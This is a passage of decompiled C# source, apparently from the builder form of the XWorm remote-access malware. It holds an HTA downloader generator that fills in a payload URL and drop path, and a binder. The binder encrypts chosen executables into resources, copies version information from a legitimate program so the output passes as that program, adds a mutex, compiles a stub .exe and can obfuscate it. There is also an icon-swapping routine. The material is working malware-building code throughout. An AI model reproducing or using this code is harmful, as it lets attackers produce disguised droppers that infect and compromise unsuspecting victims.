		Guna2ComboBox2.SelectedIndex = 1;
		Control.CheckForIllegalCrossThreadCalls = false;
		Guna2TextBox3.Text = Conversions.ToString(GClass19.int_0);
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		try
		{
			string hTA = XWorm_Resources.HTA;
			hTA = hTA.Replace("%URL%", Guna2TextBox1.Text);
			hTA = hTA.Replace("%Filename%", Guna2TextBox2.Text);
			hTA = hTA.Replace("%Path%", Guna2ComboBox1.Text);
			SaveFileDialog1.Filter = "(*.hta)|*.hta";
			SaveFileDialog1.FileName = "Downloader";
			if (SaveFileDialog1.ShowDialog() == DialogResult.OK)
			{
				StreamWriter streamWriter = new StreamWriter(SaveFileDialog1.FileName, append: false);
				streamWriter.WriteLine(hTA);
				streamWriter.Close();
				MessageBox.Show(SaveFileDialog1.FileName, "DONE!");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton2_Click(object sender, EventArgs e)
	{
		try
		{
			Guna2TextBox4.ForeColor = Color.Black;
			Guna2TextBox4.Text = "Wait..";
			Guna2GradientButton2.Enabled = false;
			method_1(Convert.ToInt32(Guna2TextBox3.Text));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Guna2GradientButton2.Enabled = true;
			Guna2TextBox4.ForeColor = Color.Red;
			Guna2TextBox4.Text = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	public string method_0()
	{
		string result;
		try
		{
			if (Operators.CompareString(GClass19.string_2, string.Empty, TextCompare: false) == 0)
			{
				GClass19.string_2 = new WebClient().DownloadString("http://ip-api.com/csv/?fields=status,query").Replace("\n", "").Split(',')[1];
				result = GClass19.string_2;
			}
			else
			{
				result = GClass19.string_2;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = "127.0.0.1";
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_217_PortCheck))]
	[DebuggerStepThrough]
	public void method_1(int Port)
	{
		VB_0024StateMachine_217_PortCheck stateMachine = new VB_0024StateMachine_217_PortCheck();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_Port = Port;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	private void Guna2GradientButton4_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		OpenFileDialog openFileDialog2 = openFileDialog;
		openFileDialog2.Filter = "(*.exe;*.ico;)|*.exe;*.ico";
		openFileDialog2.InitialDirectory = Application.StartupPath + "\\Icons";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			if (openFileDialog.FileName.EndsWith(".exe"))
			{
				Guna2TextBox6.Text = Module0.smethod_17(openFileDialog.FileName);
				PictureBox2.ImageLocation = Guna2TextBox6.Text;
				GC.Collect();
			}
			else
			{
				Guna2TextBox6.Text = openFileDialog.FileName;
				PictureBox2.ImageLocation = Guna2TextBox6.Text;
			}
		}
		else
		{
			Guna2TextBox6.Text = "...";
			PictureBox2.Image = null;
		}
		openFileDialog2 = null;
	}

	private void Guna2GradientButton6_Click(object sender, EventArgs e)
	{
		try
		{
			if (!((Operators.CompareString(Guna2TextBox6.Text, null, TextCompare: false) == 0) | (Operators.CompareString(Guna2TextBox5.Text, null, TextCompare: false) == 0) | (Operators.CompareString(Guna2TextBox6.Text, "...", TextCompare: false) == 0) | (Operators.CompareString(Guna2TextBox5.Text, "...", TextCompare: false) == 0)))
			{
				GClass1.smethod_0(Guna2TextBox5.Text, Guna2TextBox6.Text);
				MessageBox.Show(Guna2TextBox5.Text, "DONE!");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton3_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "(*.exe|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			Guna2TextBox5.Text = openFileDialog.FileName;
		}
		else
		{
			Guna2TextBox5.Text = "...";
		}
	}

	private void AddToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		OpenFileDialog openFileDialog2 = openFileDialog;
		openFileDialog2.Filter = "(*.*|*.*";
		openFileDialog2.Multiselect = true;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			string[] fileNames = openFileDialog.FileNames;
			foreach (string text in fileNames)
			{
				try
				{
					Icon icon = Icon.ExtractAssociatedIcon(text);
					if (icon != null)
					{
						ImageList2.Images.Add(icon);
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Debug.WriteLine(ex.Message);
					ProjectData.ClearProjectError();
				}
				ListViewItem listViewItem = L1.Items.Add(text, checked(ImageList2.Images.Count - 1));
				listViewItem.SubItems.Add(smethod_0(text));
				listViewItem.SubItems.Add("True");
				listViewItem.SubItems.Add("False");
			}
			GC.Collect();
		}
		openFileDialog2 = null;
		L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
	}

	private void RemoveToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			foreach (ListViewItem selectedItem in L1.SelectedItems)
			{
				L1.Items.RemoveAt(selectedItem.Index);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		L1.Items.Clear();
	}

	public static string smethod_0(string TheFile)
	{
		if (TheFile.Length == 0)
		{
			return "";
		}
		if (!File.Exists(TheFile))
		{
			return "";
		}
		return Module0.smethod_11(checked((long)(ulong)MyProject.Computer.FileSystem.GetFileInfo(TheFile).Length));
	}

	public static string smethod_1(int lenght)
	{
		string text = "asdfghjklqwertyuiopmnbvcxz";
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= lenght; i = checked(i + 1))
		{
			int startIndex = random_0.Next(0, text.Length);
			stringBuilder.Append(text.Substring(startIndex, 1));
		}
		return stringBuilder.ToString();
	}

	private void L1_DragDrop(object sender, DragEventArgs e)
	{
		string[] array = (string[])e.Data.GetData(DataFormats.FileDrop);
		foreach (string text in array)
		{
			if (!File.Exists(text))
			{
				continue;
			}
			try
			{
				Icon icon = Icon.ExtractAssociatedIcon(text);
				if (icon != null)
				{
					ImageList2.Images.Add(icon);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Debug.WriteLine(ex.Message);
				ProjectData.ClearProjectError();
			}
			ListViewItem listViewItem = L1.Items.Add(text, checked(ImageList2.Images.Count - 1));
			listViewItem.SubItems.Add(smethod_0(text));
			listViewItem.SubItems.Add("True");
			listViewItem.SubItems.Add("False");
		}
		GC.Collect();
		L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
	}

	private void L1_DragEnter(object sender, DragEventArgs e)
	{
		if (e.Data.GetDataPresent(DataFormats.FileDrop))
		{
			e.Effect = DragDropEffects.Copy;
		}
	}

	private void TrueToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			foreach (ListViewItem selectedItem in L1.SelectedItems)
			{
				selectedItem.SubItems[2].Text = "True";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FalseToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			foreach (ListViewItem selectedItem in L1.SelectedItems)
			{
				selectedItem.SubItems[2].Text = "False";
				selectedItem.SubItems[3].Text = "False";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void TrueToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			foreach (ListViewItem selectedItem in L1.SelectedItems)
			{
				if (Operators.CompareString(selectedItem.SubItems[2].Text, "True", TextCompare: false) == 0)
				{
					selectedItem.SubItems[3].Text = "True";
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FalseToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			foreach (ListViewItem selectedItem in L1.SelectedItems)
			{
				selectedItem.SubItems[3].Text = "False";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton5_Click(object sender, EventArgs e)
	{
		if (L1.Items.Count <= 0)
		{
			return;
		}
		try
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog
			{
				Filter = ".exe (*.exe)|*.exe",
				OverwritePrompt = false,
				FileName = "Output"
			};
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				StringBuilder stringBuilder = new StringBuilder();
				Random random = new Random();
				int num = 1;
				do
				{
					int index = random.Next(0, string_0.Length);
					char value = string_0[index];
					stringBuilder.Append(value);
					num = checked(num + 1);
				}
				while (num <= 17);
				string_3 = stringBuilder.ToString();
				method_2(saveFileDialog.FileName, Conversions.ToString(object_0));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	public void method_2(string Path, string Res)
	{
		try
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			dictionary.Add("CompilerVersion", "v4.0");
			VBCodeProvider vBCodeProvider = new VBCodeProvider(dictionary);
			CompilerParameters compilerParameters = new CompilerParameters();
			string compilerOptions = " /target:winexe /platform:anycpu /nowarn";
			CompilerParameters compilerParameters2 = compilerParameters;
			compilerParameters2.GenerateExecutable = true;
			compilerParameters2.OutputAssembly = Path;
			compilerParameters2.CompilerOptions = compilerOptions;
			compilerParameters2.IncludeDebugInformation = false;
			compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compilerParameters2.ReferencedAssemblies.Add("system.dll");
			compilerParameters2.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
			string binder = XWorm_Resources.Binder;
			binder = binder.Replace("#ParentRes", Conversions.ToString(object_0));
			binder = binder.Replace("%Path%", Guna2ComboBox2.Text);
			binder = binder.Replace("%Mutex%", string_3);
			binder = binder.Replace("%SPL%", string_4);
			if (Guna2CheckBox1.Checked)
			{
				FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(string_1);
				binder = Strings.Replace(binder, "%Title%", versionInfo.FileDescription);
				binder = Strings.Replace(binder, "%Des%", versionInfo.Comments);
				binder = Strings.Replace(binder, "%Company%", versionInfo.CompanyName);
				binder = Strings.Replace(binder, "%Product%", versionInfo.ProductName);
				binder = Strings.Replace(binder, "%Copyright%", versionInfo.LegalCopyright);
				binder = Strings.Replace(binder, "%Trademark%", versionInfo.LegalTrademarks);
				binder = Strings.Replace(binder, "%Guid%", Guid.NewGuid().ToString());
				binder = binder.Replace("%v1%", versionInfo.FileMajorPart.ToString());
				binder = binder.Replace("%v2%", versionInfo.FileMinorPart.ToString());
				binder = binder.Replace("%v3%", versionInfo.FileBuildPart.ToString());
				binder = binder.Replace("%v4%", versionInfo.FilePrivatePart.ToString());
			}
			else
			{
				binder = Strings.Replace(binder, "%Title%", null);
				binder = Strings.Replace(binder, "%Des%", null);
				binder = Strings.Replace(binder, "%Company%", null);
				binder = Strings.Replace(binder, "%Product%", null);
				binder = Strings.Replace(binder, "%Copyright%", null);
				binder = Strings.Replace(binder, "%Trademark%", null);
				binder = Strings.Replace(binder, "%Guid%", Guid.NewGuid().ToString());
				binder = binder.Replace("%v1%", Conversions.ToString(1));
				binder = binder.Replace("%v2%", Conversions.ToString(0));
				binder = binder.Replace("%v3%", Conversions.ToString(0));
				binder = binder.Replace("%v4%", Conversions.ToString(0));
			}
			string text = null;
			using (ResourceWriter resourceWriter = new ResourceWriter(System.IO.Path.GetTempPath() + "\\" + Res + ".Resources"))
			{
				foreach (ListViewItem item in L1.Items)
				{
					string path = item.SubItems[0].Text;
					string text2 = item.SubItems[2].Text;
					string text3 = item.SubItems[3].Text;
					string fileName = System.IO.Path.GetFileName(path);
					resourceWriter.AddResource(fileName, smethod_2(File.ReadAllBytes(path)));
					text = text + "\"" + fileName + string_4 + text2 + string_4 + text3 + "\",";
				}
				resourceWriter.Generate();
				binder = binder.Replace("\"%list%\"", text.Trim().TrimEnd(','));
			}
			compilerParameters2.EmbeddedResources.Add(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(System.IO.Path.GetTempPath() + "\\", object_0), ".Resources")));
			CompilerResults compilerResults = vBCodeProvider.CompileAssemblyFromSource(compilerParameters, binder);
			if (compilerResults.Errors.Count > 0)
			{
				foreach (object error in compilerResults.Errors)
				{
					Interaction.MsgBox(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(error), null, "ErrorText", new object[0], null, null, null)), MsgBoxStyle.Critical);
				}
			}
			compilerParameters2 = null;
			string path2 = System.IO.Path.GetTempPath() + "\\" + Res + ".Resources";
			if (File.Exists(path2))
			{
				File.Delete(path2);
			}
			if (Guna2CheckBox2.Checked)
			{
				GClass1.smethod_0(Path, string_2);
			}
			if (Guna2CheckBox3.Checked)
			{
				Debug.WriteLine(Obfuscator.Save(File.ReadAllBytes(Path), Path));
			}
			GC.Collect();
			FileInfo fileInfo = new FileInfo(Path);
			MessageBox.Show(Path, "DONE! : " + Module0.smethod_11(fileInfo.Length));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private static byte[] smethod_2(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(string_3));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void Guna2CheckBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (Guna2CheckBox2.Checked)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Filter = "(*.exe;*.ico;)|*.exe;*.ico";
			openFileDialog2.InitialDirectory = Application.StartupPath + "\\Icons";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				if (openFileDialog.FileName.EndsWith(".exe"))
				{
					string_2 = Module0.smethod_17(openFileDialog.FileName);
					PictureBox3.ImageLocation = string_2;
				}
				else
				{
					string_2 = openFileDialog.FileName;
					PictureBox3.ImageLocation = string_2;
				}
			}
			else
			{
				string_2 = null;
				PictureBox3.Image = null;
				Guna2CheckBox2.Checked = false;
			}
			openFileDialog2 = null;
		}
		if (!Guna2CheckBox2.Checked)
		{
			string_2 = null;
			PictureBox3.Image = null;
			Guna2CheckBox2.Checked = false;
		}
	}

	private void Guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (Guna2CheckBox1.Checked)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "(*.exe|*.exe";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string_1 = openFileDialog.FileName;
			}
			else
			{
				string_1 = null;
				Guna2CheckBox1.Checked = false;
			}
		}
		if (!Guna2CheckBox1.Checked)
		{
			string_1 = null;
			Guna2CheckBox1.Checked = false;
		}
	}

	private void L1_KeyDown(object sender, KeyEventArgs e)
	{
		try
		{
			if (e.Modifiers != Keys.Control || e.KeyCode != Keys.A || L1.Items.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem item in L1.Items)
			{
				item.Selected = true;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}
}